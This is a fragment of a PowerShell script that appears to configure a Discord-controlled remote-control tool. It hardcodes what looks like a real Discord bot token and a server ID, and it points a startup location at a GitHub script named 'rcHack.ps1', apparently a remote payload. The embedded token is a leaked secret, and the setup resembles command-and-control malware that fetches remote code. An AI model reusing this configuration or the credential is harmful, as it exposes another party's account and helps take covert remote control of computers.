...
function Sanitize-Token {
    ...
    # Remove any characters that are not part of the token (e.g., extra characters added for obfuscation)
    $sanitizedToken = $token -replace '[^a-zA-Z0-9\._-]', ''
    return $sanitizedToken
}

# Your bot token goes here
# EXAMPLE: $token = "MTA0ODE4MjEwMTA1MTQ2MDM3.AJif8F.9Uod-6ND1QAO38pwPJ7Ishvu5Eb"
$rawToken = "MTM0MzAwMDQ3NjE1Njk1NjgwNQ.G_ePwA.eVAJJT0EBOaSB9TqyczO0a-zTRGxKDMOFno55Q"

# Sanitize the token
$token = Sanitize-Token -token $rawToken

# Your server id goes here
# example: $guildId = "1199929856564584245"
$guildId = "1339095131902709863"
...
$StartupPsOnlineFileLocation = "https://github.com/Maddox1211/powershell/blob/main/rcHack.ps1"
